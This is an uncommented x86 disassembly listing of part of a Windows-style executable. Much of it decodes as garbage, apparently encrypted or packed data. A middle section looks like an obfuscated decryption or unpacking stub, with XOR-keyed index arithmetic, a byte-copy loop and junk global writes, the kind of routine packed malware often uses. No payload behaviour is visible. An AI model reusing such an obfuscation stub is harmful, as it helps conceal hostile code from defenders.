  40a00c:	pop    ebx
  40a00d:	call   0x81ddb2a6
  40a012:	jmp    0x2113:0x6f6b233b
  40a019:	addr16 retf 
  40a01b:	sbb    eax,DWORD PTR ds:0xd7c98a80
  40a021:	fbstp  TBYTE PTR [ecx+0x52]
  40a024:	mov    esi,0x9bf3c6d6
  40a029:	fst    DWORD PTR [eax-0x33e368df]
  40a02f:	adc    DWORD PTR [edx-0x646a134e],esp
  40a035:	push   eax
  40a036:	sti    
  40a037:	iret   
  40a038:	in     eax,dx
  40a039:	(bad)  
  40a03a:	in     eax,dx
  40a03b:	inc    ebp
  40a03c:	cwde   
  40a03d:	int    0xe2
  40a03f:	nop
  40a040:	cwde   
  40a041:	call   0xb98d:0x4e2687f4
  40a048:	sub    dh,bl
  40a04a:	mov    esi,0x29e226c
  40a04f:	enter  0x9094,0x76
  40a053:	xchg   ecx,eax
  40a054:	push   eax
  40a055:	cmp    DWORD PTR [edx-0x7d31bc7f],0xf5977f47
  40a05f:	fsubr  DWORD PTR [eax]
  40a061:	cmp    DWORD PTR [eax+0x5f9bbea9],ecx
  40a067:	mov    ds:0x28d5810e,eax
  40a06c:	arpl   WORD PTR [edi+0x77],bp
  40a06f:	imul   eax
  40a071:	rcr    edi,1
  40a073:	mov    bh,0x54
  40a075:	push   edx
  40a076:	push   0xb741927e
  40a07b:	xchg   esi,eax
  40a07c:	cmp    eax,0xef0b3a5a
  40a081:	adc    eax,DWORD PTR [edi-0x14e21a96]
  40a087:	lahf   
  40a088:	test   al,0x3f
  40a08a:	lods   al,BYTE PTR cs:[esi]
  40a08c:	jae    0x40a100
  40a08e:	add    esp,edx
  40a090:	sti    
  40a091:	pop    ss
  40a092:	pusha  
  40a093:	jae    0x40a0a2
  40a095:	cmp    BYTE PTR [eax],ch
  40a097:	xchg   edx,eax
  40a098:	(bad)  [ebp-0x7f]
  40a09b:	push   ebx
  40a09c:	or     BYTE PTR [ecx+eax*1-0x3fe3f1ed],dl
  40a0a3:	jl     0x40a0c8
  40a0a5:	or     edx,DWORD PTR [ebp-0x50]
  40a0a8:	ror    BYTE PTR [edx],0x35
  40a0ab:	dec    esp
  40a0ac:	sbb    dh,BYTE PTR [edi-0x59]
  40a0af:	mov    al,BYTE PTR [ecx+0x73752134]
  40a0b5:	inc    eax
  40a0b6:	icebp  
  40a0b7:	fistp  DWORD PTR [esi+0x2a9aa8bd]
  40a0bd:	cmp    dh,ah
  40a0bf:	add    BYTE PTR [esi+0x1cbf653f],al
  40a0c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0c6:	fs mov bh,0xda
  40a0c9:	or     BYTE PTR [edi+0x70],ch
  40a0cc:	aad    0x3
  40a0ce:	mov    ds:0x7abeeeaa,eax
  40a0d3:	hlt    
  40a0d4:	js     0x40a08a
  40a0d6:	test   al,0xef
  40a0d8:	xor    BYTE PTR ds:0xb92c2827,bl
  40a0de:	mov    BYTE PTR [ebx],0x15
  40a0e1:	fsubr  DWORD PTR [esi-0x6f0e24e8]
  40a0e7:	ja     0x40a07b
  40a0e9:	test   BYTE PTR [ebp+0x67],ch
  40a0ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0ed:	(bad)  
  40a0ee:	das    
  40a0ef:	mov    WORD PTR [ecx],?
  40a0f1:	jmp    0x40a0d9
  40a0f3:	pushf  
  40a0f4:	imul   ecx,eax
  40a0f7:	sbb    eax,DWORD PTR [ebp-0xf]
  40a0fa:	jnp    0x40a14c
  40a0fc:	add    DWORD PTR ds:0x140dbc1f,ecx
  40a102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a103:	mov    edx,0xdf5e8b85
  40a108:	lods   al,BYTE PTR ds:[esi]
  40a109:	xchg   edx,eax
  40a10a:	lods   eax,DWORD PTR ds:[esi]
  40a10b:	push   edx
  40a10c:	sub    ah,0x9c
  40a10f:	dec    esp
  40a110:	(bad)
  40a113:	aam    0xf9
  40a115:	push   0xffffffde
  40a117:	inc    ebx
  40a118:	test   al,0x8b
  40a11a:	inc    edi
  40a11b:	stos   DWORD PTR es:[edi],eax
  40a11c:	test   edx,ebp
  40a11e:	fsubr  st,st(2)
  40a120:	je     0x40a0c3
  40a122:	cmp    esp,ecx
  40a124:	bound  ecx,QWORD PTR [ebp-0x19]
  40a127:	jecxz  0x40a0f9
  40a129:	add    al,0x61
  40a12b:	mov    al,ds:0xa4746b1a
  40a130:	sub    ebx,DWORD PTR [esi-0x7ddd4b99]
  40a136:	dec    ecx
  40a137:	push   edx
  40a138:	mov    ebp,0x67906048
  40a13d:	fstp   DWORD PTR ds:[edi]
  40a140:	adc    eax,ecx
  40a142:	cmp    DWORD PTR [ebx],ebp
  40a144:	mov    ebp,0xa944a3ce
  40a149:	jne    0x40a19a
  40a14b:	mov    ?,WORD PTR [edi]
  40a14d:	int3   
  40a14e:	mov    ah,0xaf
  40a150:	movsx  ecx,cx
  40a153:	iret   
  40a154:	xchg   esi,eax
  40a155:	mov    ds:0x71e845a5,eax
  40a15a:	daa    
  40a15b:	dec    esp
  40a15c:	mov    esp,0xf00db9bf
  40a161:	bound  esp,QWORD PTR [esi+0x7ad5bf70]
  40a167:	out    0x78,al
  40a169:	inc    ecx
  40a16a:	mov    ebx,0x67559de0
  40a16f:	push   0xffffffe7
  40a171:	jbe    0x40a193
  40a173:	push   ebp
  40a174:	out    0x13,eax
  40a176:	mov    WORD PTR [ecx-0x565d75e2],es
  40a17c:	inc    ebp
  40a17d:	std    
  40a17e:	push   esi
  40a17f:	inc    edx
  40a180:	adc    ebx,0x2d7d1ad1
  40a186:	adc    DWORD PTR [ebx-0x5860e1ce],esi
  40a18c:	xor    ch,dh
  40a18e:	push   edx
  40a18f:	mov    ds:0x216c0c98,eax
  40a194:	pusha  
  40a195:	int    0xc3
  40a197:	mov    esp,0xb94b5e90
  40a19c:	sbb    eax,0x5722e0c5
  40a1a1:	mov    WORD PTR [esi-0x54e55c1c],ss
  40a1a7:	jae    0x40a14a
  40a1a9:	pushf  
  40a1aa:	mov    al,0xe9
  40a1ac:	xor    cl,bl
  40a1ae:	aad    0xc4
  40a1b0:	mov    dl,0x11
  40a1b2:	gs or  esp,0x9d179752
  40a1b9:	push   ss
  40a1ba:	mov    ah,dl
  40a1bc:	hlt    
  40a1bd:	xor    edi,esp
  40a1bf:	and    eax,0x254eef9e
  40a1c4:	xor    eax,0x826a3a6f
  40a1c9:	xchg   esi,eax
  40a1ca:	xchg   ebx,eax
  40a1cb:	rcr    edx,1
  40a1cd:	imul   DWORD PTR [edi+esi*2+0x0]
  40a1d1:	jmp    0x40a243
  40a1d3:	(bad)  
  40a1d4:	sub    eax,0xe1f8a2f
  40a1d9:	xchg   DWORD PTR [edi-0xc],edx
  40a1dc:	jmp    0xdee6:0x331932b9
  40a1e3:	cwde   
  40a1e4:	fincstp 
  40a1e6:	dec    ebp
  40a1e7:	and    bl,al
  40a1e9:	lea    esp,[edx-0x40ebc672]
  40a1ef:	dec    esi
  40a1f0:	stos   DWORD PTR es:[edi],eax
  40a1f1:	lock xchg esi,eax
  40a1f3:	test   eax,0xcd00a520
  40a1f8:	mov    edx,DWORD PTR [ebx-0x19]
  40a1fb:	mov    bl,0xe5
  40a1fd:	cmp    esi,eax
  40a1ff:	jne    0x40a21b
  40a205:	mov    eax,DWORD PTR [ebp-0x4]
  40a208:	mov    esi,DWORD PTR [ebp-0x8]
  40a20b:	xor    eax,edx
  40a20d:	xor    esi,edx
  40a20f:	add    eax,ecx
  40a211:	add    esi,ecx
  40a213:	imul   eax,esi
  40a216:	jmp    0x40a256
  40a21b:	mov    eax,DWORD PTR [ebp+0xc]
  40a21e:	mov    eax,DWORD PTR [eax+0x78]
  40a221:	mov    DWORD PTR [ebp+0xc],eax
  40a224:	mov    eax,DWORD PTR [ebp-0x4]
  40a227:	mov    esi,DWORD PTR [ebp-0x8]
  40a22a:	xor    eax,edx
  40a22c:	xor    esi,edx
  40a22e:	add    eax,ecx
  40a230:	add    esi,ecx
  40a232:	imul   eax,esi
  40a235:	mov    esi,DWORD PTR [ebp+0xc]
  40a238:	cmp    esi,eax
  40a23a:	mov    eax,DWORD PTR [ebp-0x4]
  40a23d:	je     0x40a208
  40a243:	xor    eax,edx
  40a245:	add    eax,ecx
  40a247:	mov    ecx,DWORD PTR [ebp+0xc]
  40a24a:	imul   eax,ecx
  40a24d:	add    eax,DWORD PTR [ebp+0x8]
  40a250:	mov    DWORD PTR [ebp+0xc],eax
  40a253:	mov    eax,DWORD PTR [ebp+0xc]
  40a256:	pop    esi
  40a257:	leave  
  40a258:	ret    0x8
  40a25b:	push   ebp
  40a25c:	mov    ebp,esp
  40a25e:	sub    esp,0x10
  40a261:	sbb    eax,DWORD PTR ds:0x413c88
  40a267:	mov    eax,0xf89c85b0
  40a26c:	xor    edx,edx
  40a26e:	xor    edx,DWORD PTR ds:0x414014
  40a274:	sub    DWORD PTR ds:0x413cf4,edx
  40a27a:	mov    DWORD PTR [ebp-0x4],eax
  40a27d:	add    ecx,ecx
  40a27f:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40a286:	or     DWORD PTR ds:0x414014,edi
  40a28c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a28f:	push   esi
  40a290:	mov    edx,0x7510894
  40a295:	add    esi,0x25d7
  40a29b:	xor    ecx,edx
  40a29d:	mov    DWORD PTR ds:0x413d30,0x18
  40a2a7:	cmp    DWORD PTR ds:0x413d30,0x0
  40a2ae:	je     0x40a2e4
  40a2b4:	cmp    DWORD PTR ds:0x413d30,0x19
  40a2bb:	jne    0x40a2cc
  40a2c1:	push   0x413ce8
  40a2c6:	call   DWORD PTR ds:0x41679c
  40a2cc:	mov    esi,DWORD PTR ds:0x413d30
  40a2d2:	dec    esi
  40a2d3:	mov    DWORD PTR ds:0x413d30,esi
  40a2d9:	jmp    0x40a2a7
  40a2de:	add    esi,DWORD PTR ds:0x413d24
  40a2e4:	mov    esi,0x3272dc
  40a2e9:	neg    DWORD PTR ds:0x413d24
  40a2ef:	push   edi
  40a2f0:	mov    edi,DWORD PTR [ebp+0x10]
  40a2f3:	adc    DWORD PTR ds:0x414008,0x741e
  40a2fd:	add    ecx,esi
  40a2ff:	cmp    ecx,edi
  40a301:	mov    DWORD PTR ds:0x413c80,0x1b1e
  40a30b:	je     0x40a474
  40a311:	mov    ecx,DWORD PTR [ebp-0x4]
  40a314:	mov    edi,DWORD PTR [ebp+0x10]
  40a317:	xor    eax,eax
  40a319:	xor    ecx,edx
  40a31b:	adc    DWORD PTR ds:0x413d2c,0x414008
  40a325:	add    ecx,esi
  40a327:	add    edi,0xfabdbeef
  40a32d:	adc    eax,0xffffffff
  40a330:	neg    DWORD PTR ds:0x413c88
  40a336:	xor    eax,0x0
  40a339:	mov    DWORD PTR [ebp-0xc],eax
  40a33c:	push   ebx
  40a33d:	movzx  eax,BYTE PTR ds:0x413d30
  40a344:	adc    DWORD PTR ds:0x414018,eax
  40a34a:	xor    ebx,ebx
  40a34c:	xor    edi,0x8a29a125
  40a352:	mov    eax,ds:0x413c12
  40a357:	and    DWORD PTR ds:0x413cdc,eax
  40a35d:	mov    eax,ecx
  40a35f:	add    eax,0xfabdbeef
  40a364:	mov    DWORD PTR ds:0x413c6c,0x7b3
  40a36e:	adc    ebx,0xffffffff
  40a371:	add    DWORD PTR ds:0x413c88,0x414018
  40a37b:	xor    eax,0x8a29a125
  40a380:	mov    DWORD PTR ds:0x413d18,0x6932
  40a38a:	xor    ebx,0x0
  40a38d:	mov    DWORD PTR ds:0x413cd8,0x53fd
  40a397:	cmp    eax,edi
  40a399:	mov    DWORD PTR ds:0x413c88,0x1215
  40a3a3:	jne    0x40a3c6
  40a3a9:	mov    DWORD PTR ds:0x413c16,0x2565
  40a3b3:	cmp    ebx,DWORD PTR [ebp-0xc]
  40a3b6:	je     0x40a46e
  40a3bc:	jmp    0x40a3c6
  40a3c1:	mov    esi,0x3272dc
  40a3c6:	and    DWORD PTR ds:0x413d30,0x0
  40a3d0:	xor    eax,eax
  40a3d2:	xor    eax,DWORD PTR ds:0x413d30
  40a3d8:	inc    eax
  40a3d9:	mov    ds:0x413d30,eax
  40a3de:	cmp    DWORD PTR ds:0x413d30,0x26
  40a3e5:	jne    0x40a3f9
  40a3eb:	push   0x413d20
  40a3f0:	push   DWORD PTR [ebp-0x10]
  40a3f3:	call   DWORD PTR ds:0x41675c
  40a3f9:	cmp    DWORD PTR ds:0x413d30,0x1f
  40a400:	jb     0x40a3d0
  40a406:	mov    eax,DWORD PTR [ebp-0x4]
  40a409:	mov    edi,DWORD PTR [ebp-0x8]
  40a40c:	xor    edi,edx
  40a40e:	add    edi,esi
  40a410:	mov    esi,DWORD PTR [ebp+0x8]
  40a413:	imul   edi,ecx
  40a416:	mov    ebx,DWORD PTR [ebp+0xc]
  40a419:	xor    eax,edx
  40a41b:	add    eax,ecx
  40a41d:	mov    al,BYTE PTR [ebx+eax*1+0x3272dc]
  40a424:	mov    BYTE PTR [edi+esi*1],al
  40a427:	mov    eax,DWORD PTR [ebp-0x8]
  40a42a:	mov    esi,DWORD PTR [ebp+0x10]
  40a42d:	xor    eax,edx
  40a42f:	xor    ebx,ebx
  40a431:	add    esi,0xfabdbeef
  40a437:	adc    ebx,0xffffffff
  40a43a:	lea    ecx,[ecx+eax*1+0x3272dc]
  40a441:	xor    edi,edi
  40a443:	xor    esi,0x8a29a125
  40a449:	xor    ebx,0x0
  40a44c:	mov    eax,ecx
  40a44e:	add    eax,0xfabdbeef
  40a453:	adc    edi,0xffffffff
  40a456:	xor    eax,0x8a29a125
  40a45b:	xor    edi,0x0
  40a45e:	cmp    eax,esi
  40a460:	jne    0x40a3c1
  40a466:	cmp    edi,ebx
  40a468:	jne    0x40a3c1
  40a46e:	mov    eax,0xf89c85b1
  40a473:	pop    ebx
  40a474:	pop    edi
  40a475:	pop    esi
  40a476:	leave  
  40a477:	ret    0xc
  40a47a:	push   ebp
  40a47b:	mov    ebp,esp
  40a47d:	sub    esp,0xa4
  40a483:	sbb    DWORD PTR ds:0x413cf4,0x6aac
  40a48d:	mov    ecx,DWORD PTR [ebp+0x8]
  40a490:	and    DWORD PTR ds:0x414008,0x0
  40a49a:	mov    eax,ds:0x414008
  40a49f:	inc    eax
  40a4a0:	mov    ds:0x414008,eax
  40a4a5:	cmp    DWORD PTR ds:0x414008,0x6
  40a4ac:	jne    0x40a4c5
  40a4b2:	push   DWORD PTR [ebp-0x18]
  40a4b5:	push   0x41401c
  40a4ba:	push   0x1f9d
  40a4bf:	call   DWORD PTR ds:0x416760
  40a4c5:	cmp    DWORD PTR ds:0x414008,0x5
  40a4cc:	jne    0x40a4dd
  40a4d2:	mov    eax,ds:0x414008
  40a4d7:	inc    eax
  40a4d8:	mov    ds:0x414008,eax
  40a4dd:	cmp    DWORD PTR ds:0x414008,0x1b
  40a4e4:	jb     0x40a49a
  40a4ea:	mov    DWORD PTR ds:0x41401c,0x17
  40a4f4:	cmp    DWORD PTR ds:0x41401c,0x0
  40a4fb:	je     0x40a54c
  40a501:	cmp    DWORD PTR ds:0x41401c,0x6
  40a508:	jne    0x40a524
  40a50e:	push   DWORD PTR [ebp-0x24]
  40a511:	push   0x3b56
  40a516:	push   DWORD PTR [ebp-0x1c]
  40a519:	push   0x73b3
  40a51e:	call   DWORD PTR ds:0x416764
  40a524:	cmp    DWORD PTR ds:0x41401c,0x7
  40a52b:	jne    0x40a53c
  40a531:	mov    eax,ds:0x41401c
  40a536:	dec    eax
  40a537:	mov    ds:0x41401c,eax
  40a53c:	mov    eax,ds:0x41401c
  40a541:	dec    eax
  40a542:	mov    ds:0x41401c,eax
  40a547:	jmp    0x40a4f4
  40a54c:	mov    eax,0x8a87
  40a551:	xor    ax,WORD PTR [ecx+0x20]
  40a555:	not    DWORD PTR ds:0x413cf4
  40a55b:	mov    ecx,0x3b4a
  40a560:	adc    DWORD PTR ds:0x413c0a,0x414008
  40a56a:	add    ax,cx
  40a56d:	movzx  eax,ax
  40a570:	mov    DWORD PTR [ebp-0x18],eax
  40a573:	mov    ecx,DWORD PTR ds:0x413c78
  40a579:	sbb    DWORD PTR ds:0x413d28,ecx
  40a57f:	mov    BYTE PTR [ebp-0x1],0x7d
  40a583:	add    ecx,DWORD PTR ds:0x414000
  40a589:	lea    eax,[ebp-0x1]
  40a58c:	xor    DWORD PTR ds:0x413c78,ecx
  40a592:	mov    DWORD PTR [ebp-0x10],eax
  40a595:	add    DWORD PTR ds:0x413d1c,0x4151
  40a59f:	mov    al,BYTE PTR [ebp-0x1]
  40a5a2:	mov    ecx,DWORD PTR [ebp-0x10]
  40a5a5:	or     DWORD PTR ds:0x413d20,0x66e0
  40a5af:	xor    al,0x70
  40a5b1:	and    DWORD PTR ds:0x414000,0x34d9
  40a5bb:	sub    al,0xc
  40a5bd:	and    DWORD PTR ds:0x413d1c,0x413c70
  40a5c7:	mov    BYTE PTR [ecx],al
  40a5c9:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  40a5d0:	or     DWORD PTR ds:0x413ce0,ecx
  40a5d6:	push   ebx
  40a5d7:	jmp    0x40c95f
  40a5dc:	and    ch,BYTE PTR ds:0xb393b193
  40a5e2:	add    cl,BYTE PTR [edi-0x6bf6fe89]
  40a5e8:	jmp    0x40a581
  40a5ea:	iret   
  40a5eb:	adc    al,0x27
  40a5ed:	push   es
  40a5ee:	jl     0x40a66c
  40a5f0:	pop    es
  40a5f1:	pop    edi
  40a5f2:	jl     0x40a670
  40a5f4:	ja     0x40a5f5
  40a5f6:	xor    ebx,DWORD PTR [esp+ebp*2+0x1772247d]
  40a5fd:	sub    ah,al
  40a5ff:	push   es
  40a600:	jecxz  0x40a58f
  40a602:	aad    0xe9
  40a604:	stos   BYTE PTR es:[edi],al
  40a605:	xchg   BYTE PTR ds:0x732009ef,ch
  40a60b:	cmp    al,0xfa
  40a60d:	in     al,dx
  40a60e:	and    eax,0x1711845c
  40a613:	sub    al,0x9c
  40a615:	add    al,0xf0
  40a617:	jp     0x40a658
  40a619:	mov    ecx,0x424056c1
  40a61e:	mov    esp,DWORD PTR [edi-0xd]
  40a621:	retf   0x6a43
  40a624:	sahf   
  40a625:	mov    esp,ecx
  40a627:	retf   0x8ebd
  40a62a:	dec    edx
  40a62b:	sbb    al,0xd6
  40a62d:	mov    cs,edx
  40a62f:	xchg   edx,eax
  40a630:	or     ebp,ecx
  40a632:	adc    esp,DWORD PTR [edx+0x15]
  40a635:	(bad)  
  40a636:	jmp    0xb6832b39
  40a63b:	jmp    0xe0dd0dbc
  40a640:	retf   0xcb68
  40a643:	add    DWORD PTR [eax+0x3b326520],0xffffffa1
  40a64a:	repnz lock dec eax
  40a64d:	xchg   esp,eax
  40a64e:	pushf  
  40a64f:	push   edi
  40a650:	xchg   BYTE PTR [ebx],cl
  40a652:	in     al,0x55
  40a654:	jecxz  0x40a629
  40a656:	shr    dh,0xcb
  40a659:	sub    DWORD PTR [eax],esp
  40a65b:	adc    esi,esp
  40a65d:	sub    edx,0x55ddf200
  40a663:	inc    ebp
  40a664:	sbb    dl,BYTE PTR [edi+0x5fc1d57e]
  40a66a:	pop    eax
  40a66b:	les    ebp,FWORD PTR [edx-0x12f3982f]
  40a671:	pop    DWORD PTR [ecx-0x3c83eca]
  40a677:	push   ebp
  40a678:	pop    edi
  40a679:	dec    eax
  40a67a:	(bad)  
  40a67b:	jmp    0xb924:0xe9d1fbd6
  40a682:	jmp    0x35d1:0x1dad7f2e
  40a689:	icebp  
  40a68a:	repnz dec edi
  40a68c:	test   BYTE PTR [eax-0x4c59ba73],0xc1
  40a693:	mov    ch,0xa3
  40a695:	xor    bl,ch
  40a697:	push   es
  40a698:	not    DWORD PTR [esi]
  40a69a:	frstor [ecx]
  40a69c:	push   eax
  40a69d:	das    
  40a69e:	dec    eax
  40a69f:	bound  edx,QWORD PTR [edx+ebp*2]
  40a6a2:	mov    edx,0xa6f61fbd
  40a6a7:	jp     0x40a6e4
  40a6a9:	data16 into 
  40a6ab:	jecxz  0x40a70a
  40a6ad:	jno    0x40a6c6
  40a6af:	push   0x7ca4fce3
  40a6b4:	mov    ebp,0xa02e902a
  40a6b9:	stc    
  40a6ba:	fmul   st(3),st
  40a6bc:	push   eax
  40a6bd:	add    DWORD PTR [edi+0x22],ecx
  40a6c0:	cmc    
  40a6c1:	icebp  
  40a6c2:	or     BYTE PTR [edx],ah
  40a6c4:	ins    DWORD PTR es:[edi],dx
  40a6c5:	adc    DWORD PTR [eax+0x52],ebp
  40a6c8:	and    BYTE PTR [esp+eax*4-0x42386d8d],bh
  40a6cf:	mov    al,0xad
  40a6d1:	test   eax,0x15009894
  40a6d6:	(bad)  
  40a6d7:	outs   dx,DWORD PTR ds:[esi]
  40a6d8:	dec    edx
  40a6d9:	mov    al,0x2f
  40a6db:	test   eax,0x581143ac
  40a6e0:	fs push esi
  40a6e2:	pop    esp
  40a6e3:	aaa    
  40a6e4:	js     0x40a744
  40a6e6:	in     eax,0x30
  40a6e8:	clc    
  40a6e9:	sub    al,0x6b
  40a6eb:	daa    
  40a6ec:	xchg   esp,eax
  40a6ed:	fsub   QWORD PTR [edi]
  40a6ef:	shr    BYTE PTR [ecx],0x2e
  40a6f2:	dec    esi
  40a6f3:	xchg   ebp,eax
  40a6f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6f5:	(bad)  
  40a6f6:	frstor [edx+edi*2-0x70]
  40a6fa:	mov    ebx,0x93c31a4
  40a6ff:	neg    DWORD PTR [esi-0x77]
  40a702:	jne    0x40a756
  40a704:	cs sbb eax,0x770bc2c5
  40a70a:	in     al,0x1b
  40a70c:	iret   
  40a70d:	cmp    ah,BYTE PTR [ebx-0x6a]
  40a710:	xchg   ebx,eax
  40a711:	call   0x7512:0x4870b468
  40a718:	out    0x39,eax
  40a71a:	mov    es,WORD PTR [edx+0x1a]
  40a71d:	mov    al,0xcc
  40a71f:	and    dl,BYTE PTR [ebp+0x73]
  40a722:	imul   esp,DWORD PTR [edx+ecx*2-0x23b77554],0x792c93
  40a72d:	and    DWORD PTR [ecx],0xffffffe5
  40a730:	xchg   DWORD PTR [edi+0x3a],ebp
  40a733:	cmp    esi,DWORD PTR [ebx+0x73]
  40a736:	call   0xd51c:0x8e08b43e
  40a73d:	sub    DWORD PTR [eax],edi
  40a73f:	push   es
  40a740:	popa   
  40a741:	out    dx,al
  40a742:	cmp    dh,dh
  40a744:	cs mov esp,0xe188bb6b
  40a74a:	fiadd  WORD PTR [eax-0x28]
  40a74d:	in     al,0x9d
  40a74f:	dec    esp
  40a750:	xor    eax,0xc19be572
  40a755:	sub    DWORD PTR [esp+eax*8],ecx
  40a758:	cwde   
  40a759:	(bad)  
  40a75a:	cwde   
  40a75b:	pop    ss
  40a75c:	pop    ss
  40a75d:	in     al,dx
  40a75e:	gs loop 0x40a736
  40a761:	test   BYTE PTR [edi],0x39
  40a764:	xor    eax,0xac081c82
  40a769:	mov    edi,0x8a66b025
  40a76e:	inc    esi
  40a76f:	cmp    DWORD PTR [esi-0x7cc74151],esi
  40a775:	les    edi,FWORD PTR [edi]
  40a777:	mov    ebx,0x94bcf467
  40a77c:	dec    ebx
  40a77d:	xchg   BYTE PTR [edx],ch
  40a77f:	pushf  
  40a780:	imul   ebx,edx,0x5a
  40a783:	ja     0x40a70b
  40a785:	sub    al,0x66
  40a787:	pusha  
  40a788:	icebp  
  40a789:	ds retf 0xb3c1
  40a78d:	inc    eax
  40a78e:	std    
  40a78f:	lahf   
  40a790:	out    dx,eax
  40a791:	test   BYTE PTR ds:0x4d47395a,ch
  40a797:	addr16 jne 0x40a809
  40a79a:	sub    DWORD PTR [edx+0x22d956bf],0x6b6197e8
  40a7a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7a5:	jns    0x40a74f
  40a7a7:	aad    0xb0
  40a7a9:	or     eax,0xafb4566e
  40a7ae:	jge    0x40a762
  40a7b0:	imul   ecx,DWORD PTR [ecx+0x1a],0xffffffd6
  40a7b4:	nop
  40a7b5:	sub    BYTE PTR [edi+0x4b],dh
  40a7b8:	xchg   ebp,eax
  40a7b9:	mul    ecx
  40a7bb:	and    al,0x61
  40a7bd:	dec    esp
  40a7be:	push   esi
  40a7bf:	dec    esp
  40a7c0:	or     cl,ch
  40a7c2:	jb     0x40a811
  40a7c4:	push   ebx
  40a7c5:	mov    BYTE PTR [ebx],dl
  40a7c7:	inc    eax
  40a7c8:	fdiv   st(4),st
  40a7ca:	pop    eax
  40a7cb:	or     DWORD PTR [eax+0x38ef64c7],ebp
  40a7d1:	xor    DWORD PTR [edi+eiz*1-0x1b857a2f],edi
  40a7d8:	pop    ss
  40a7d9:	jmp    0x8d31:0xbd088d12
  40a7e0:	pop    ebp
  40a7e1:	pop    ecx
  40a7e2:	xor    DWORD PTR [eax-0xc05d840],0xffffffb3
  40a7e9:	int    0x84
  40a7eb:	cmp    BYTE PTR [ebp+0x22],al
  40a7ee:	out    0x58,eax
  40a7f0:	leave  
  40a7f1:	shl    DWORD PTR [ebx-0x6],0x4a
  40a7f5:	mov    fs,WORD PTR [edi+0xa8ea65c]
  40a7fb:	je     0x40a7ce
  40a7fd:	das    
  40a7fe:	out    dx,eax
  40a7ff:	sub    al,0xc2
  40a801:	mov    ebx,0x6e881957
  40a806:	ror    BYTE PTR [ebx+0x4e],1
  40a809:	daa    
  40a80a:	pop    es
  40a80b:	sub    ecx,DWORD PTR [esp+edx*4]
  40a80e:	dec    esp
  40a80f:	ror    edx,0x5e
  40a812:	xchg   ecx,eax
  40a813:	and    ah,ch
  40a815:	cwde   
  40a816:	cli    
  40a817:	lock adc dh,bh
  40a81a:	lock imul edi,DWORD PTR [ecx+0x14f1b7e8],0x184bd18c
  40a825:	xor    al,0xe
  40a827:	xchg   ecx,eax
  40a828:	jne    0x40a7f6
  40a82a:	xchg   ebx,eax
  40a82b:	pop    edi
  40a82c:	and    ecx,ecx
  40a82e:	call   0xf1e0:0x33fa5b1c
  40a835:	test   eax,0xea7d07f4
  40a83a:	pop    esi
  40a83b:	imul   ebp,DWORD PTR [eax-0x44],0xc92a0d48
  40a842:	mov    edi,0x3b01583f
  40a847:	ss pop ds
  40a849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a84a:	imul   edi,DWORD PTR [eax-0x43b5b5bc],0x699c65d7
  40a854:	jo     0x40a7e3
  40a856:	out    0x53,eax
  40a858:	fmul   DWORD PTR [eax]
  40a85a:	pop    ds
  40a85b:	adc    ebp,ebp
  40a85d:	mov    cl,0x5
  40a85f:	adc    eax,0x8f2d99e4
  40a864:	and    BYTE PTR [ebx+0x4e8b96cc],dh
  40a86a:	test   eax,0x17be8228
  40a86f:	or     dh,BYTE PTR [esi-0x5be3010b]
  40a875:	mov    al,ds:0x84b0dbdb
  40a87a:	mov    cl,cl
  40a87c:	or     esi,edi
  40a87e:	fisub  DWORD PTR ds:0xe2e85ddd
  40a884:	dec    esp
  40a885:	adc    dl,BYTE PTR ds:[ebp+0x20]
  40a889:	les    edi,FWORD PTR [ebx-0x42af7b99]
  40a88f:	pop    es
  40a890:	jbe    0x40a88d
  40a892:	add    cl,dl
  40a894:	cs aad 0x83
  40a897:	mov    DWORD PTR [ebp-0x4],edx
  40a89a:	sahf   
  40a89b:	sbb    al,0xea
  40a89d:	mov    ebx,ebx
  40a89f:	std    
  40a8a0:	icebp  
  40a8a1:	cmp    ebx,esp
  40a8a3:	sbb    DWORD PTR ds:0x143666b5,ecx
  40a8a9:	push   esp
  40a8aa:	ret    0xf00a
  40a8ad:	pop    ds
  40a8ae:	mov    WORD PTR [ebp-0x6b],cs
  40a8b1:	jmp    0x40a86c
  40a8b3:	adc    al,0x72
  40a8b5:	(bad)  
  40a8b6:	and    BYTE PTR [esi],ah
  40a8b8:	jp     0x40a8ec
  40a8ba:	add    al,0xe
  40a8bc:	dec    ecx
  40a8bd:	out    dx,al
  40a8be:	sbb    eax,0x51615cdf
  40a8c3:	jl     0x40a8d2
  40a8c5:	xor    al,0xa0
  40a8c7:	dec    ebp
  40a8c8:	mov    DWORD PTR [edx+edx*4-0x2b55a888],edx
  40a8cf:	dec    edi
  40a8d0:	mov    DWORD PTR [ebp-0x139d40ea],eax
  40a8d6:	(bad)  
  40a8d7:	test   al,0xef
  40a8d9:	pop    bp
  40a8db:	in     al,0x62
  40a8dd:	xchg   bl,dl
  40a8df:	xchg   edx,eax
  40a8e0:	imul   esi,DWORD PTR ss:[ecx+0x5e],0xffffff92
  40a8e5:	fs pop es
  40a8e7:	or     edi,eax
  40a8e9:	and    esi,DWORD PTR [ecx]
  40a8eb:	(bad)  
  40a8ec:	rcl    DWORD PTR [ebx],0x5
  40a8ef:	outs   dx,DWORD PTR ds:[esi]
  40a8f0:	pop    eax
  40a8f1:	loope  0x40a87c
  40a8f3:	ret    
  40a8f4:	mov    cl,0x63
  40a8f6:	adc    BYTE PTR [esi-0x46d5b1e7],0x4e
  40a8fd:	sahf   
  40a8fe:	ja     0x40a932
  40a900:	sbb    al,0x24
  40a902:	sub    eax,0x9da057c1
  40a907:	(bad)  
  40a909:	jbe    0x40a89a
  40a90b:	cli    
  40a90c:	clc    
  40a90d:	adc    esp,DWORD PTR [esi-0x11]
  40a910:	inc    edi
  40a911:	or     BYTE PTR [ecx+0x36],cl
  40a914:	mov    ?,WORD PTR [eax]
  40a916:	test   BYTE PTR [ecx+0x7e977d80],ah
  40a91c:	jmp    0x7a6a:0xf5faa5a3
  40a923:	call   DWORD PTR [ebp-0x1e9cdeae]
  40a929:	adc    eax,0x6e0ce86c
  40a92e:	cmp    BYTE PTR [edi],0x57
  40a931:	pop    esp
  40a932:	(bad)  
